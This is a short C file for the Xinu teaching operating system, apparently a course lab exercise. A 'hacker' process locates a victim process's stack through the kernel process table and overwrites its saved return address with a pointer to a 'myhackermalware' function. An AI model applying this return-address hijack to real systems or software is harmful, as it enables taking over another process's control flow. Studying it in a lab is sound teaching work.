#include<xinu.h>
#include<stdio.h>

extern int victimglobal;
unsigned long plzhackme_content;
extern void myhackermalware(int);

void myhacker(int victim_pid) {
    kprintf("[Hacker %d] began execution\n", currpid);
    unsigned long* victim_sp = (unsigned long*)proctab[victim_pid].prstkptr;
    unsigned long* victim_bp = victim_sp + 2;
    unsigned long* victim_sleeper_bp = (unsigned long*) *victim_bp;
    unsigned long* plzhackme = victim_sleeper_bp + 1;
    plzhackme_content = *plzhackme;
	*plzhackme = (unsigned long) &myhackermalware;
    kprintf("[Hacker %d] victim's return address changed\n",currpid);
    kprintf("[Hacker %d] now exiting\n",currpid);
    return;
}
